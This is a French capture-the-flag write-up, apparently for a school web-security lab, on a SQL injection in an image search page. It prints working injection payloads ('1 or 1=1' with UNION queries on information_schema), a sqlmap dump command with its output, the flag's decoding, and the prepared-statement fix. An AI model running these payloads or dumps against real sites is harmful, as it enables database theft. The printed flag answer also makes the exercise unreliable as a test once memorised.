# Explications 

Sur la page member search, il y a une SQL Injection.

On peut afficher toutes les images de la table en recherchant : "1 or 1=1"

On peut imaginer une requete forgée comme ca derriere : 

```sql
SELECT id, title, url FROM images WHERE id = $_GET['id']
```

en passant une UNION dans la requete, on peut donc lui faire afficher ce qu'on veut.

Sur la base de donnée MySQL une database (information_schema) contient des informations cruciales, on peut lui faire afficher les autres db / tables / columns

```
1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
```

On peut voir une table qui s'appele : "list_images" avec une column interessante : "comment"

J'attaque directement par cette requete :

```sql
1 or 1=1 UNION select url, comment from list_images
```

on obtient une consigne qui nous invite a : 

```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

1928e8083cf461a51303633093573c46 (md5->plain text) albatroz
albatroz (asci->sha256) f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

----

# Cas d'usage

Obtenir un dump de la DB, tous pleins d'infos utiles :)
 
----

# Comment l'eviter ?

Il faut a tout pris passer par des requetes SQL dites prepared, les ORM font tres bien le boulot.
(cf: PDO::prepare)

----

# Good to Know

sqlmap un petit tool en python qui a fait ses preuves depuis, peu permettre de rechercher des SQLi, un petit exemple:

sqlmap -u "http://192.168.2.128/?page=searchimg&id=1&Submit=Submit#" --dump -T list_images -D Member_images

```
Database: Member_images
Table: list_images
[6 entries]
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| id | url                              | title     | comment                                                                                                               |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
```

Plutot puissant non ?